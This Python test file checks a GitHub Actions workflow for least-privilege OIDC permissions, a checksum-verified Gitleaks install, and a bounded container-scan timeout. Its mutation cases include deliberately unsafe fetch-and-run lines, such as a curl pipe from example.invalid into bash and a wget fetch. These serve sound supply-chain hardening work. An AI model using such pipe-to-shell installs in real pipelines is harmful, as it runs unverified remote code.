from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).parents[2]
WORKFLOW_PATH = ROOT / ".github" / "workflows" / "ci.yml"
GITLEAKS_VERSION = "8.21.2"
GITLEAKS_LINUX_X64_SHA256 = "5bc41815076e6ed6ef8fbecc9d9b75bcae31f39029ceb55da08086315316e3ba"


@pytest.fixture(autouse=True)
def _close_global_dj_cache_between_tests():
    """Workflow contract tests never import or mutate the application cache."""
    yield


def _workflow(text: str | None = None) -> dict:
    source = text if text is not None else WORKFLOW_PATH.read_text(encoding="utf-8")
    return yaml.load(source, Loader=yaml.BaseLoader)


def _oidc_permissions_are_least_privilege(workflow: dict) -> bool:
    if workflow.get("permissions") != {"contents": "read"}:
        return False

    jobs = workflow["jobs"]
    if jobs["test"].get("permissions") != {
        "contents": "read",
        "id-token": "write",
    }:
        return False

    return _codecov_uses_oidc(workflow) and all(
        job_name == "test" or job.get("permissions", {}).get("id-token") != "write"
        for job_name, job in jobs.items()
    )


def _codecov_uses_oidc(workflow: dict) -> bool:
    codecov_steps = [
        step
        for step in workflow["jobs"]["test"]["steps"]
        if step.get("uses") == "codecov/codecov-action@v6"
    ]
    return len(codecov_steps) == 1 and codecov_steps[0].get("with", {}).get("use_oidc") == "true"


def _gitleaks_script(workflow: dict) -> str:
    for step in workflow["jobs"]["quality"]["steps"]:
        if step.get("name") == "Gitleaks — secret scan":
            return step["run"]
    raise AssertionError("Gitleaks quality step is missing")


def _gitleaks_install_is_verified(workflow: dict) -> bool:
    script = _gitleaks_script(workflow)
    required_lines = (
        "set -euo pipefail",
        f'GITLEAKS_VERSION="{GITLEAKS_VERSION}"',
        f'GITLEAKS_SHA256="{GITLEAKS_LINUX_X64_SHA256}"',
        'GITLEAKS_ARCHIVE="gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"',
        'curl --fail --silent --show-error --location --proto "=https" \\\n'
        '  --output "$GITLEAKS_ARCHIVE" \\\n'
        '  "https://github.com/gitleaks/gitleaks/releases/download/'
        'v${GITLEAKS_VERSION}/${GITLEAKS_ARCHIVE}"',
        'printf \'%s  %s\\n\' "$GITLEAKS_SHA256" "$GITLEAKS_ARCHIVE"'
        " | sha256sum --check --strict -",
        'tar -xzf "$GITLEAKS_ARCHIVE" gitleaks',
        "./gitleaks detect --source . --no-banner --redact --exit-code 1",
    )
    return script.strip() == "\n".join(required_lines)


def _container_scan_has_bounded_timeout(workflow: dict) -> bool:
    scan_steps = [
        step
        for step in workflow["jobs"]["container"]["steps"]
        if step.get("name") == "Scan built image"
    ]
    return len(scan_steps) == 1 and scan_steps[0].get("with", {}).get("timeout") == "15m0s"


def test_codecov_oidc_permission_is_scoped_to_test_job() -> None:
    workflow = _workflow()
    assert _oidc_permissions_are_least_privilege(workflow)

    workflow["permissions"]["id-token"] = "write"
    assert not _oidc_permissions_are_least_privilege(workflow)

    workflow = _workflow()
    workflow["jobs"]["quality"]["permissions"] = {"id-token": "write"}
    assert not _oidc_permissions_are_least_privilege(workflow)

    workflow = _workflow()
    del workflow["jobs"]["test"]["permissions"]
    assert not _oidc_permissions_are_least_privilege(workflow)

    workflow = _workflow()
    for step in workflow["jobs"]["test"]["steps"]:
        if step.get("uses") == "codecov/codecov-action@v6":
            del step["with"]["use_oidc"]
            break
    assert not _oidc_permissions_are_least_privilege(workflow)

    workflow = _workflow()
    for step in workflow["jobs"]["test"]["steps"]:
        if step.get("uses") == "codecov/codecov-action@v6":
            step["with"]["use_oidc"] = "false"
            break
    assert not _oidc_permissions_are_least_privilege(workflow)


def test_gitleaks_archive_is_pinned_verified_then_extracted() -> None:
    workflow = _workflow()
    assert _gitleaks_install_is_verified(workflow)

    script = _gitleaks_script(workflow)
    download = "\n".join(
        (
            'curl --fail --silent --show-error --location --proto "=https" \\',
            '  --output "$GITLEAKS_ARCHIVE" \\',
            '  "https://github.com/gitleaks/gitleaks/releases/download/'
            'v${GITLEAKS_VERSION}/${GITLEAKS_ARCHIVE}"',
        )
    )
    checksum = (
        'printf \'%s  %s\\n\' "$GITLEAKS_SHA256" "$GITLEAKS_ARCHIVE" | sha256sum --check --strict -'
    )
    extract = 'tar -xzf "$GITLEAKS_ARCHIVE" gitleaks'
    execute = "./gitleaks detect --source . --no-banner --redact --exit-code 1"
    mutations = (
        script.replace(GITLEAKS_LINUX_X64_SHA256, "0" * 64),
        script.replace("sha256sum --check --strict -", "sha256sum --version"),
        script.replace(extract, f"{extract} || true"),
        script.replace("set -euo pipefail", "set +e"),
        script.replace(download, f"{download}\n{download}"),
        script.replace(checksum, f"{checksum}\n{checksum}"),
        script.replace(extract, f"{extract}\n{extract}"),
        script.replace(execute, f"{execute}\n{execute}"),
        f"{script}\ncurl --proto '=https' https://example.invalid/install | bash\n",
        script.replace(
            extract,
            "curl -fsSL https://example.invalid/gitleaks.tar.gz | tar -xz",
        ),
        f"{script}\nwget --https-only https://example.invalid/install\n",
    )
    for mutation in mutations:
        changed = _workflow()
        for step in changed["jobs"]["quality"]["steps"]:
            if step.get("name") == "Gitleaks — secret scan":
                step["run"] = mutation
                break
        assert not _gitleaks_install_is_verified(changed)


def test_container_scan_has_explicit_bounded_timeout() -> None:
    workflow = _workflow()
    assert _container_scan_has_bounded_timeout(workflow)

    scan_step = next(
        step
        for step in workflow["jobs"]["container"]["steps"]
        if step.get("name") == "Scan built image"
    )
    del scan_step["with"]["timeout"]
    assert not _container_scan_has_bounded_timeout(workflow)
